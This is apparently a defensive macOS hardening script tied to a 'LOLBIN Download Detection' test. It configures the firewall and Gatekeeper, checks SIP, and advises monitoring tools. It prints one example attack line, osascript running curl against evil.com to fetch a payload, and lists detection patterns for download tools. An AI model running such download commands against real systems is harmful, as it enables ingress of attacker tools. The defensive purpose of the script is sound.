#!/usr/bin/env bash
# ============================================================================
# DEFENSE GUIDANCE: macOS Hardening Script
# ============================================================================
# Test ID: f2c8a3b6-1d7e-8c5f-2a9b-6e7f8a9b0c06
# Test Name: LOLBIN Download Detection
# MITRE ATT&CK: T1105 - Ingress Tool Transfer, T1059.001 - PowerShell
# Created: 2026-03-13
# Author: F0RT1KA Defense Guidance Builder
# ============================================================================
#
# macOS equivalent of LOLBIN download hardening. Targets native macOS
# utilities commonly abused for ingress tool transfer:
# - curl (built-in)
# - python3 (pre-installed or Xcode)
# - osascript (AppleScript HTTP requests)
# - swift (scripted downloads)
#
# ============================================================================

set -euo pipefail

SCRIPT_NAME="$(basename "$0")"
UNDO=false
DRY_RUN=false

# ============================================================================
# Parse Arguments
# ============================================================================
while [[ $# -gt 0 ]]; do
    case "$1" in
        --undo)    UNDO=true; shift ;;
        --dry-run) DRY_RUN=true; shift ;;
        -h|--help)
            echo "Usage: $SCRIPT_NAME [--undo] [--dry-run]"
            exit 0
            ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

# ============================================================================
# Helper Functions
# ============================================================================

info()    { echo -e "\033[0;36m[INFO]\033[0m $1"; }
success() { echo -e "\033[0;32m[OK]\033[0m $1"; }
warn()    { echo -e "\033[0;33m[WARN]\033[0m $1"; }
error()   { echo -e "\033[0;31m[ERR]\033[0m $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (sudo)"
        exit 1
    fi
}

run_cmd() {
    if $DRY_RUN; then
        info "[DRY-RUN] Would execute: $*"
    else
        "$@"
    fi
}

# ============================================================================
# 1. Endpoint Security Monitoring
# ============================================================================

setup_endpoint_monitoring() {
    info "=== Endpoint Security Monitoring ==="

    if $UNDO; then
        info "Monitoring is non-destructive - no revert needed"
        return
    fi

    # Check for Endpoint Security framework tools
    if command -v eslogger &>/dev/null; then
        success "eslogger is available (macOS 13+)"
        info "Monitor download tool execution:"
        info "  sudo eslogger exec > /var/log/es_exec.log &"
        info "  # Filter for download tools:"
        info "  sudo eslogger exec | grep -E 'curl|wget|python|osascript'"
    else
        warn "eslogger not available (requires macOS 13+)"
        info "Consider using Endpoint Security API-based tools"
    fi

    # Check for osquery
    if command -v osqueryi &>/dev/null; then
        success "osquery is available"
        info "Query for download activity:"
        info "  SELECT * FROM process_events WHERE path LIKE '%curl%' OR path LIKE '%wget%';"
    else
        warn "osquery not installed - recommended for endpoint visibility"
        info "Install: brew install osquery"
    fi

    # Enable OpenBSM audit logging
    local audit_control="/etc/security/audit_control"
    if [[ -f "$audit_control" ]]; then
        if grep -q "ex" "$audit_control"; then
            info "Execution auditing already enabled in OpenBSM"
        else
            warn "Consider adding 'ex' (exec) flag to audit_control"
            info "Edit $audit_control and add 'ex' to the flags line"
        fi
    fi
}

# ============================================================================
# 2. Application Firewall Configuration
# ============================================================================

configure_firewall() {
    info "=== Application Firewall Configuration ==="

    if $UNDO; then
        info "Firewall changes are non-destructive - no revert needed"
        return
    fi

    # Enable macOS application firewall
    local fw_status
    fw_status=$(/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null || echo "unknown")
    if echo "$fw_status" | grep -q "enabled"; then
        success "Application firewall is enabled"
    else
        if ! $DRY_RUN; then
            /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
            success "Application firewall enabled"
        fi
    fi

    # Enable stealth mode
    local stealth_status
    stealth_status=$(/usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode 2>/dev/null || echo "unknown")
    if echo "$stealth_status" | grep -q "enabled"; then
        info "Stealth mode already enabled"
    else
        if ! $DRY_RUN; then
            /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
            success "Stealth mode enabled"
        fi
    fi

    # Block unsigned applications from receiving inbound connections
    if ! $DRY_RUN; then
        /usr/libexec/ApplicationFirewall/socketfilterfw --setallowsigned on 2>/dev/null || true
        /usr/libexec/ApplicationFirewall/socketfilterfw --setallowsignedapp off 2>/dev/null || true
        success "Blocked unsigned apps from accepting inbound connections"
    fi
}

# ============================================================================
# 3. Gatekeeper and Code Signing Enforcement
# ============================================================================

enforce_code_signing() {
    info "=== Gatekeeper and Code Signing ==="

    if $UNDO; then
        info "Gatekeeper enforcement is protective - not reverting"
        return
    fi

    # Verify Gatekeeper is enabled
    local gk_status
    gk_status=$(spctl --status 2>/dev/null || echo "unknown")
    if echo "$gk_status" | grep -q "enabled"; then
        success "Gatekeeper is enabled"
    else
        if ! $DRY_RUN; then
            run_cmd spctl --master-enable
            success "Gatekeeper enabled"
        fi
    fi

    # Verify SIP
    local sip_status
    sip_status=$(csrutil status 2>/dev/null || echo "unknown")
    if echo "$sip_status" | grep -q "enabled"; then
        success "System Integrity Protection (SIP) is enabled"
    else
        warn "SIP is NOT enabled - critical for download protection"
        warn "Enable SIP: Boot to Recovery Mode > Terminal > csrutil enable"
    fi

    # Check XProtect is up to date
    info "Ensure automatic XProtect updates are enabled:"
    info "  System Preferences > Software Update > Automatically keep my Mac up to date"
}

# ============================================================================
# 4. Download Tool Restrictions
# ============================================================================

restrict_download_tools() {
    info "=== Download Tool Restrictions ==="

    if $UNDO; then
        info "Download tool restrictions are advisory - no revert needed"
        return
    fi

    # Check for Homebrew-installed download tools
    local brew_tools=("wget" "aria2" "axel" "httrack")
    for tool in "${brew_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            warn "Found download tool: $tool ($(which "$tool"))"
            info "  Consider restricting or monitoring usage"
        fi
    done

    # Check for Python download capabilities
    if command -v python3 &>/dev/null; then
        info "python3 is available - can be used for downloads via urllib/requests"
        info "Consider restricting python3 execution for non-admin users"
    fi

    # osascript can make HTTP requests
    if [[ -f "/usr/bin/osascript" ]]; then
        info "osascript is available - can make HTTP requests via AppleScript"
        info "  Example: osascript -e 'do shell script \"curl http://evil.com/payload\"'"
    fi

    # Santa binary allowlisting
    if [[ -d "/Applications/Santa.app" ]] || command -v santactl &>/dev/null; then
        success "Google Santa is installed - configure allowlisting rules"
        info "  santactl rule --whitelist --path /usr/bin/curl"
        info "  santactl rule --blacklist --path /usr/local/bin/wget"
    else
        info "Consider installing Google Santa for binary allowlisting"
        info "  https://santa.dev"
    fi
}

# ============================================================================
# 5. Network Monitoring
# ============================================================================

setup_network_monitoring() {
    info "=== Network Monitoring ==="

    if $UNDO; then
        info "Network monitoring is non-destructive - no revert needed"
        return
    fi

    # Check for Little Snitch or similar
    if [[ -d "/Library/Little Snitch" ]] || [[ -d "/Applications/Little Snitch.app" ]]; then
        success "Little Snitch detected - configure per-process network rules"
    elif [[ -d "/Applications/Lulu.app" ]]; then
        success "LuLu detected - configure per-process outbound blocking"
    else
        info "Consider installing a host-based firewall for per-process monitoring:"
        info "  - LuLu (free, open source): https://objective-see.org/products/lulu.html"
        info "  - Little Snitch (commercial): https://www.obdev.at/products/littlesnitch/"
    fi

    # pf firewall for network monitoring
    info "macOS pf firewall can log outbound connections:"
    info "  Add to /etc/pf.conf:"
    info "    pass out log all"
    info "  Then monitor: sudo tcpdump -ni pflog0"
}

# ============================================================================
# 6. PowerShell Core Hardening (if installed)
# ============================================================================

harden_pwsh_macos() {
    info "=== PowerShell Core Hardening (T1059.001) ==="

    if $UNDO; then
        info "PowerShell hardening is non-destructive - no revert needed"
        return
    fi

    if ! command -v pwsh &>/dev/null; then
        info "PowerShell Core (pwsh) not installed - skipping"
        return
    fi

    info "PowerShell Core found at: $(which pwsh)"

    # Enable logging
    local pwsh_config="/usr/local/microsoft/powershell/7/powershell.config.json"
    local pwsh_dir="$(dirname "$pwsh_config")"
    if [[ -d "$pwsh_dir" ]] || [[ -d "/opt/microsoft/powershell/7" ]]; then
        pwsh_config="${pwsh_dir:-/opt/microsoft/powershell/7}/powershell.config.json"
        if ! $DRY_RUN; then
            cat > "$pwsh_config" << 'EOF'
{
    "PowerShellPolicies": {
        "ScriptBlockLogging": {
            "EnableScriptBlockLogging": true,
            "EnableScriptBlockInvocationLogging": true
        },
        "ModuleLogging": {
            "EnableModuleLogging": true,
            "ModuleNames": ["*"]
        }
    }
}
EOF
            success "PowerShell logging configuration created"
        fi
    fi
}

# ============================================================================
# Main Execution
# ============================================================================

echo ""
echo "============================================================"
echo "  LOLBIN Download Detection - macOS Hardening"
echo "  Test ID: f2c8a3b6-1d7e-8c5f-2a9b-6e7f8a9b0c06"
echo "============================================================"
echo ""

check_root

if $UNDO; then
    warn "REVERTING hardening changes..."
else
    info "APPLYING hardening settings..."
fi
echo ""

setup_endpoint_monitoring
echo ""
configure_firewall
echo ""
enforce_code_signing
echo ""
restrict_download_tools
echo ""
setup_network_monitoring
echo ""
harden_pwsh_macos
echo ""

echo "============================================================"
if $UNDO; then
    warn "Hardening reverted."
else
    success "Hardening complete."
fi
echo "============================================================"
echo ""
